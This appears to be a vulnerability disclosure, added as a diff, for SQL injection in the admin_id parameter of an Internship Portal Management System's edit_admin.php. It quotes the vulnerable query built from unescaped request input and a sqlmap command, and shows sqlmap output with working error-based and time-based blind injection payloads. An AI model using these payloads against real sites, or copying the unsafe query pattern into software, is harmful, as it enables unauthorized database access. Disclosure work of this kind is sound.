@@ -1,0 +1,35 @@
+Internship Portal Management System - SQL Injection on (admin/edit_admin.php?admin_id=XX) 
+
+Vendor Homepage:
+https://www.sourcecodester.com/php/11712/internship-portal-management-system.html 
+
+Version:V1.0
+
+Tested on: PHP, Apache, MySQL
+
+Affected Page:
+edit_admin.php
+On this page, admin_id parameter is vulnerable to SQL Injection Attack 
+
+Source Code(intern_sys/admin/edit_admin.php):
+<?php
+	$q_admin = $conn->query("SELECT * FROM `admin` WHERE `admin_id` = '$_REQUEST[admin_id]'") or die($conn->error);
+	$f_admin = $q_admin->fetch_array();
+?>
+
+Proof of vulnerability(Verify using the sqlmap tool after logining):
+
+-> sqlmap -u http://localhost/intern_sys/admin/edit_admin.php?admin_id=2 --batch
+
+Output:
+---
+Parameter: admin_id (GET)
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: admin_id=2' AND GTID_SUBSET(CONCAT(0x71626a7671,(SELECT (ELT(9831=9831,1))),0x71717a6b71),9831)-- yfes
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: admin_id=2' AND (SELECT 9274 FROM (SELECT(SLEEP(5)))hfDf)-- NgEN
+---
+[08:29:41] [INFO] the back-end DBMS is MySQL
